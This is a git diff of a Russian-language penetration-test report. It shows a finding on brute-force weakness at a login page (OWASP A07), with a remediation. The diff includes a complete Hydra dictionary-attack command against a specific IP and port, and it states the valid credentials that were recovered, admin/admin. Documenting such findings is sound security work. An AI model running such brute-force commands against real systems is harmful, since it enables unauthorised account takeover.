@@ -505,9 +505,9 @@ if ($bad_login)
 3. **Уязвимость к атакам BruteForce**
 
 **Категория:** [A07:2021-Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)\
-**Страница:** `http://92.51.39.106:7799/login.html`
-**Критичность:** Средняя
-**Описание:** На странице существует возможность проведения BruteForce атак, т.к. не установлен лимит на попытки ввода данных в форму авторизации.
+**Страница:** `http://92.51.39.106:7799/login.html`\
+**Критичность:** Средняя\
+**Описание:** На странице существует возможность проведения BruteForce атак, т.к. не установлен лимит на попытки ввода данных в форму авторизации.\
 **Рекомендация для исправления:** Установление ограничения попыток ввода пары логин/пароль и внедрение механизма ограничения попыток авторизации по IP-адресу.
 
 <details>
@@ -516,7 +516,7 @@ if ($bad_login)
 Используем атаку по словарю с паролями с заранее известным логином `admin`:
 
 ```sh
-hydra -l admin -P "/home/kali/Downloads/rockyou.txt" -s 7788 92.51.39.106 http-post-form "/login.html:username=admin&password=^PASS^:F=Login Failed" -f
+hydra -l admin -P "/home/kali/Downloads/passwords.txt" -s 7788 92.51.39.106 http-post-form "/login.html:username=admin&password=^PASS^:F=Login Failed" -f
 ```
 
 Через некоторое время находим валидную пару `admin/admin`:
